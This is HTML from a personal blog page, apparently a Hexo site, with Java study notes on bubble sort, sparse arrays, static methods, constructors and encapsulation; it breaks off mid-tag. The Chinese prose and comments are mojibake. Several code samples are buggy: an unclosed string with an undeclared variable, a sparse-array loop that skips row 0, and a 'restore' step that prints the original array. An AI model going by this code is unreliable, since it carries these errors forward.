class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayDemo07</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] b=&#123;<span class="number">7</span>,<span class="number">3</span>,<span class="number">65</span>,<span class="number">2</span>,<span class="number">65</span>,<span class="number">34</span>,<span class="number">74</span>&#125;;</span><br><span class="line">        <span class="type">int</span>[] sort=sort(b);</span><br><span class="line">        System.out.println(Arrays.toString(sort));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å†’æ³¡æ’åº</span></span><br><span class="line">    <span class="comment">//1.æ¯”è¾ƒæ•°ç»„ä¸­ï¼Œä¸¤ä¸ªç›¸é‚»çš„å…ƒç´ ï¼Œå¦‚æœç¬¬ä¸€ä¸ªæ•°æ¯”ç¬¬äºŒä¸ªæ•°ç»„å¤§ï¼Œæˆ‘ä»¬å°±äº¤æ¢å®ƒä»¬çš„ä½ç½®</span></span><br><span class="line">    <span class="comment">//2.æ²¡å‡ºä¸€æ¬¡æ¯”è¾ƒï¼Œéƒ½ä¼šäº§ç”Ÿä¸€ä¸ªæœ€å¤§ï¼Œæˆ–è€…æœ€å°çš„æ•°å­—</span></span><br><span class="line">    <span class="comment">//3.ä¸‹ä¸€è½®å¯ä»¥å°‘ä¸€æ¬¡æ’åº</span></span><br><span class="line">    <span class="comment">//4.ä»¥æ­¤å¾ªç¯ç›´åˆ°ç»“æŸ</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> [] sort(<span class="type">int</span>[] array)&#123;</span><br><span class="line">        <span class="comment">//å¤–å±‚å¾ªç¯ï¼Œåˆ¤æ–­èµ°å¤šå°‘æ¬¡</span></span><br><span class="line">        <span class="type">int</span> t=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;array.length-<span class="number">1</span>;i++)&#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span><span class="literal">false</span>;<span class="comment">//é€šè¿‡flagæ ‡è¯†ä¸ºå‡å°‘æ²¡æœ‰æ„ä¹‰çš„æ¯”è¾ƒ</span></span><br><span class="line">            <span class="comment">//å†…å­˜å¾ªç¯ï¼Œæ¯”è¾ƒåˆ¤æ–­ä¸¤ä¸ªæ•°ï¼Œå¦‚æœç¬¬ä¸€ä¸ªæ•°ï¼Œæ¯”ç¬¬äºŒä¸ªæ•°æ‰“ï¼Œåˆ™äº¤æ¢</span></span><br><span class="line">             <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;array.length-<span class="number">1</span>-i;j++)&#123;</span><br><span class="line">                 <span class="keyword">if</span> (array[j+<span class="number">1</span>]&lt;array[j])&#123;</span><br><span class="line">                     t=array[j];</span><br><span class="line">                     array[j]=array[j+<span class="number">1</span>];</span><br><span class="line">                     array[j+<span class="number">1</span>]=t;</span><br><span class="line">                     flag=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">if</span>(flag==<span class="literal">false</span>)&#123;</span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line">             &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> array;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ç¨€ç–æ•°ç»„"><a href="#ç¨€ç–æ•°ç»„" class="headerlink" title="ç¨€ç–æ•°ç»„"></a>ç¨€ç–æ•°ç»„</h4><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230825174855519.png"></p><p>å½“ä¸€ä¸ªæ•°ç»„ä¸­å¤§éƒ¨åˆ†å…ƒç´ ä¸º0ï¼Œæˆ–è€…ä¸ºåŒä¸€å€¼çš„æ•°ç»„æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ç¨€ç–æ•°ç»„æ¥ä¿å­˜è¯¥æ•°ç»„ã€‚ç¨€ç–æ•°ç»„çš„å¤„ç†æ–¹å¼æ˜¯:<br>è®°å½•æ•°ç»„ä¸€å…±æœ‰å‡ è¡Œå‡ åˆ—ï¼Œæœ‰å¤šå°‘ä¸ªä¸åŒå€¼<br>æŠŠå…·æœ‰ä¸åŒå€¼çš„å…ƒç´ å’Œè¡Œåˆ—åŠå€¼è®°å½•åœ¨ä¸€ä¸ªå°è§„æ¨¡çš„æ•°ç»„ä¸­ï¼Œä»è€Œç¼©å°ç¨‹åºçš„è§„æ¨¡å¦‚ä¸‹å›¾:å·¦è¾¹æ˜¯åŸå§‹æ•°ç»„ï¼Œå³è¾¹æ˜¯ç¨€ç–æ•°ç»„</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230825175125458.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qingchuan.array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayDemo08</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.åˆ›å»ºä¸€ä¸ªäºŒç»´æ•°ç»„11*11   0ï¼šæ²¡æœ‰</span></span><br><span class="line">        <span class="type">int</span>[][] array1 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">11</span>][<span class="number">11</span>];</span><br><span class="line">        array1[<span class="number">2</span>][<span class="number">3</span>] = <span class="number">1</span>;</span><br><span class="line">        array1[<span class="number">3</span>][<span class="number">4</span>] = <span class="number">1</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;è¾“å‡ºåŸå§‹çš„æ•°ç»„&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] ints : array1) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> anInt : ints) &#123;</span><br><span class="line">                System.out.print(anInt + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//è½¬æ¢ä¸ºç¨€ç–æ•°ç»„</span></span><br><span class="line">        <span class="comment">//è·å–æœ‰æ•ˆå€¼</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">11</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">11</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (array1[i][j] != <span class="number">0</span>) &#123;</span><br><span class="line">                    sum++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;&#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;æœ‰æ•ˆå€¼çš„ä¸ªæ•°ï¼š&quot;</span> + sum);</span><br><span class="line">            <span class="comment">//2.åˆ›å»ºä¸€ä¸ªç¨€ç–æ•°ç»„çš„æ•°ç»„</span></span><br><span class="line">            <span class="type">int</span>[][] array2 = <span class="keyword">new</span> <span class="title class_">int</span>[sum + <span class="number">1</span>][<span class="number">3</span>];</span><br><span class="line">            array2[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">11</span>;</span><br><span class="line">            array2[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">11</span>;</span><br><span class="line">            array2[<span class="number">0</span>][<span class="number">2</span>] = sum;</span><br><span class="line">            <span class="comment">//éå†äºŒç»´æ•°ç»„ï¼Œå°†éé›¶å€¼ï¼Œå­˜æ”¾åœ¨ç¨€ç–æ•°ç»„ä¸­</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; array1.length; i++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; array1[i].length; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (array1[i][j] != <span class="number">0</span>) &#123;</span><br><span class="line">                        count++;</span><br><span class="line">                        array2[count][<span class="number">0</span>] = i;</span><br><span class="line">                        array2[count][<span class="number">1</span>] = j;</span><br><span class="line">                        array2[count][<span class="number">2</span>] = array1[i][j];</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//è¾“å‡ºæ•°ç»„</span></span><br><span class="line">            System.out.println(<span class="string">&quot;ç¨€ç–æ•°ç»„&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; array2.length; i++) &#123;</span><br><span class="line">                System.out.println(array2[i][<span class="number">0</span>] + <span class="string">&quot;\t&quot;</span></span><br><span class="line">                        + array2[i][<span class="number">1</span>] + <span class="string">&quot;\t&quot;</span></span><br><span class="line">                        + array2[i][<span class="number">2</span>] + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;---------&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;è¿˜åŸ&quot;</span>);</span><br><span class="line">            <span class="comment">//1.è¯»å–ç¨€ç–æ•°ç»„</span></span><br><span class="line">            <span class="type">int</span>[][] array3 = <span class="keyword">new</span> <span class="title class_">int</span>[array2[<span class="number">0</span>][<span class="number">0</span>]][array2[<span class="number">0</span>][<span class="number">1</span>]];</span><br><span class="line">            <span class="comment">//2.ç»™å…¶ä¸­çš„å…ƒç´ è¿˜åŸä»–çš„å€¼</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; array2.length; i++) &#123;</span><br><span class="line">                array3[array2[i][<span class="number">0</span>]][array2[i][<span class="number">1</span>]] = array2[i][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//3.æ‰“å°</span></span><br><span class="line">            System.out.println(<span class="string">&quot;è¾“å‡ºè¿˜åŸæ•°ç»„&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span>[] ints : array1) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> anInt : ints) &#123;</span><br><span class="line">                    System.out.print(anInt + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="é¢å‘å¯¹è±¡"><a href="#é¢å‘å¯¹è±¡" class="headerlink" title="é¢å‘å¯¹è±¡"></a>é¢å‘å¯¹è±¡</h2><p>javaçš„æ ¸å¿ƒæ€æƒ³æ˜¯oop</p><p>é¢å‘è¿‡ç¨‹æ€æƒ³ï¼šæ­¥éª¤ç®€å•æ¸…æ™°ï¼Œç¬¬ä¸€æ­¥å¹²ä»€ä¹ˆï¼Œç¬¬äºŒæ­¥å¹²ä»€ä¹ˆã€‚ã€‚ã€‚</p><p>é¢å¯¹è¿‡ç¨‹é€‚åˆåƒåŠ›ä¸€äº›è¾ƒä¸ºç®€å•çš„é—®é¢˜</p><p>é¢å‘å¯¹è±¡æ€æƒ³ï¼šç‰©ä»¥ç±»èšï¼Œåˆ†ç±»çš„çš„æ€ç»´æ¨¡å¼ï¼Œæ€è€ƒé—®é¢˜é¦–å…ˆä¸ºä¸€è§£å†³æ–‡è‰ºéœ€è¦å“ªäº›åˆ†ç±»ï¼Œç„¶åå¯¹è¿™äº›åˆ†ç±»è¿›è¡Œå•ç‹¬æ€è€ƒï¼Œæœ€åæ‰å¯¹æŸä¸ªåˆ†ç±»ä¸‹çš„ç»†èŠ‚è¿›è¡Œé¢å‘è¿‡ç¨‹çš„æ€ç´¢</p><p>å¯¹äºæè¿°å¤æ‚çš„å¤±è¯¯ï¼Œä¸ºäº†ä»å®è§‚ä¸ŠæŠŠæ¡ï¼Œä»æ•´ä½“ä¸Šåˆç†åˆ†æï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨é¢å‘å¯¹è±¡çš„æ€è·¯æ¥åˆ†ææ•´ä¸ªç³»ç»Ÿã€‚ä½†æ˜¯å…·ä½“åˆ°å›´è§‚æ“ä½œï¼Œä»ç„¶éœ€è¦é¢å‘è¿‡ç¨‹çš„æ€è·¯å»å¤„ç†ã€‚</p><p>é¢å‘å¯¹è±¡ç¼–ç¨‹ï¼ˆobject-Oriented Programming,OOP)</p><p>é¢å‘è¿‡ç¨‹ç¼–ç¨‹çš„æœ¬è´¨å°±æ˜¯ï¼šä»¥ç±»çš„æ–¹å¼ç»„ç»‡ä»£ç ï¼Œä»¥å¯¹è±¡çš„ç»„ç»‡ï¼ˆå°è£…ï¼‰æ•°æ®ã€‚</p><p>æŠ½è±¡</p><p>ä¸‰å¤§ç‰¹æ€§ï¼šå°è£…   ç»§æ‰¿  å¤šæ€</p><p>ä»è®¤è¯†è®ºçš„è§’åº¦è€ƒè™‘çš„æ˜¯ç°æœ‰å¯¹è±¡åæœ‰ç±»ã€‚å¯¹è±¡ï¼Œæ˜¯å…·ä½“çš„äº‹ç‰©ã€‚ç±»æ˜¯æŠ½è±¡çš„ï¼Œæ˜¯å¯¹å¯¹è±¡çš„æŠ½è±¡</p><p>ä»ä»£ç è¿è¡Œè§’åº¦è€ƒè™‘æ˜¯å…ˆæœ‰ç±»åæœ‰å¯¹è±¡ã€‚ç±»æ˜¯å¯¹è±¡çš„æ¨¡æ¿</p><h3 id="å›é¡¾æ–¹æ³•çš„è°ƒç”¨"><a href="#å›é¡¾æ–¹æ³•çš„è°ƒç”¨" class="headerlink" title="å›é¡¾æ–¹æ³•çš„è°ƒç”¨"></a>å›é¡¾æ–¹æ³•çš„è°ƒç”¨</h3><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230826144121984.png"></p><p>####é™æ€æ–¹æ³•ä¸éé™æ€æ–¹æ³•çš„ä¸€äº›ä¸åŒ</p><p>é™æ€æ–¹æ³•æ˜¯å’Œç±»ä¸€èµ·åŠ è½½çš„ï¼Œæœ‰ç±»å°±æœ‰é™æ€æ–¹æ³•ï¼Œè€Œéé™æ€æ–¹æ³•æ˜¯ç±»å®ä¾‹åæ‰å­˜åœ¨çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public static void a()&#123;</span><br><span class="line"> b()</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">public  static void b()&#123;</span><br><span class="line">a()</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éƒ½æ˜¯é™æ€æ–¹æ³•çš„æƒ…å†µä¸‹å¯ä»¥äº’ç›¸å¼•ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public static void a()&#123;</span><br><span class="line">    b();//æŠ¥é”™</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">public  void b()&#123;</span><br><span class="line">a();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>aä¸ºé™æ€æ–¹æ³•ï¼Œbä¸ºéé™æ€æ–¹æ³•çš„æƒ…å†µä¸‹ï¼Œaæ²¡æ³•å¼•ç”¨bã€‚bå¯ä»¥å¼•ç”¨a</p><h4 id="åˆ›å»ºä¸åˆå§‹åŒ–å¯¹è±¡"><a href="#åˆ›å»ºä¸åˆå§‹åŒ–å¯¹è±¡" class="headerlink" title="åˆ›å»ºä¸åˆå§‹åŒ–å¯¹è±¡"></a>åˆ›å»ºä¸åˆå§‹åŒ–å¯¹è±¡</h4><p>ä½¿ç”¨newå…³é”®å­—åˆ›å»ºå¯¹è±¡</p><p>ä½¿ç”¨newå…³é”®å­—åˆ›å»ºçš„æ—¶å€™ï¼Œå‡ºäº†åˆ†é…å†…å­˜ç©ºé—´ä¹‹å¤–ï¼Œè¿˜ä¼šç»™åˆ›å»ºå¥½çš„å¯¹è±¡è¿›é¡¹é»˜è®¤çš„åˆå§‹åŒ–ä»¥åŠå¯¹ç±»ä¸­æ„é€ å™¨çš„è°ƒç”¨ã€‚</p><p>ç±»ä¸­çš„æ„é€ å™¨ä¹Ÿæˆä¸ºäº†æ„é€ æ–¹æ³•ï¼Œæ˜¯åœ¨è¿›è¡Œåˆ›å»ºçˆ±ä½ å¯¹è±¡çš„æ—¶å€™å¿…é¡»è¦è°ƒç”¨çš„ã€‚å¹¶ä¸”æ„é€ å™¨æœ‰ä»¥ä¸‹ä¿©ä¸ªç‰¹ç‚¹:1.å¿…é¡»å’Œç±»çš„åå­—ç›¸åŒ2.å¿…é¡»æ²¡æœ‰è¿”å›ç±»å‹ï¼Œä¹Ÿä¸èƒ½å†™void</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop.demo02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//ç±»ï¼šï¼›æŠ½è±¡  å®ä¾‹åŒ–</span></span><br><span class="line">        <span class="comment">//ç±»å®ä¾‹åŒ–åä¼šè¿”å›ä¸€ä¸ªè‡ªå·±çš„å¯¹è±¡</span></span><br><span class="line">        <span class="comment">//studentå¯¹è±¡å°±æ˜¯ä¸ªStudent</span></span><br><span class="line">        Student lzx=<span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        Student ds=<span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        lll.name=<span class="string">&quot;111;</span></span><br><span class="line"><span class="string">        ds.name=&quot;</span>æœé¡º<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        lzx.age=99;</span></span><br><span class="line"><span class="string">        ds.age=100;</span></span><br><span class="line"><span class="string">        System.out.println(ds.name+&quot;</span>å–œæ¬¢<span class="string">&quot;+lll.name);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop.demo02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="comment">//å±æ€§ï¼šå­—æ®µ</span></span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">study</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.name+<span class="string">&quot;åœ¨å­¦ä¹ &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>####æ„é€ å™¨è¯¦è§£</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230826154923945.png"></p><p>Personæ–‡ä»¶ä¸‹æ˜æ˜æ²¡æœ‰æ–¹æ³•ï¼Œä½†applicationä¸‹å´å®ä¾‹åŒ–æˆåŠŸï¼Œåœ¨ç”Ÿæˆçš„classæ–‡ä»¶ä¸‹å‡ºç°äº†ä¸€ä¸ªæ–¹æ³•ï¼Œ<img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230826155050161.png"></p><p>ä½¿ç”¨newå…³é”®å­—ï¼Œæœ¬è´¨æ˜¯è°ƒç”¨æ„é€ å™¨</p><p>å¦‚æœå­˜åœ¨äº†æœ‰å‚æ„é€ ï¼Œæ— å‚æ„é€ å°±å¿…é¡»æ˜¾ç¤ºæ„é€ </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop.demo02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.lang.model.element.NestingKind;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=<span class="string">&quot;wawakaka&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//æœ‰å‚æ„é€ </span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.oop.demo02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Person wa=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;1111&quot;</span>);</span><br><span class="line">        System.out.println(wa.name);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>alt+insertï¼ˆæˆ‘çš„åœ¨f12æ—è¾¹ï¼‰å¿«é€Ÿæ’å…¥æ„é€ å™¨</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230826164130590.png" alt="image-20230826164130590"></p><h4 id="å°è£…"><a href="#å°è£…" class="headerlink" title="å°è£…"></a>å°è£…</h4><p>è¯¥éœ²çš„éœ²ï¼Œè¯¥è—çš„è—</p><p>æˆ‘ä»¬ç¨‹åºè®¾è®¡è¦è¿½æ±‚â€œé«˜å†…èšï¼Œä½è€¦åˆâ€ã€‚é«˜å†…èšå°±æ˜¯ç±»çš„å†…éƒ¨ä¹¦è®°æ“ä½œç»†èŠ‚è‡ªå·±å®Œæˆï¼Œä¸å…è®¸å¤–éƒ¨å¹²æ¶‰ï¼›ä½è€¦åˆï¼Œä»…æš´éœ²å°‘é‡çš„æ–¹æ³•ç»™å¤–éƒ¨ä½¿ç”¨ã€‚</p><p>å°è£…ï¼ˆæ•°æ®çš„éšè—)</p><p>é€šå¸¸ï¼Œåº”é‡‘åˆ¶ç›´æ¥è®¿é—®ä¸€ä¸ªå¯¹è±¡ä¸­æ•°æ®çš„å®é™…è¡¨ç¤ºï¼Œè€Œåº”é€šè¿‡æ“ä½œæ¥å£æ¥è®¿é—®ï¼Œè¿™æˆä¸ºä¿¡æ¯éšè—</p><p>å±æ€§ç§æœ‰ï¼Œget&#x2F;set</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop.Demo04;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="comment">//å±æ€§ç§æœ‰</span></span><br><span class="line">    <span class="keyword">private</span> String name;<span class="comment">//å§“å</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id ;<span class="comment">//å­¦å·</span></span><br><span class="line">    <span class="keyword">private</span>  <span 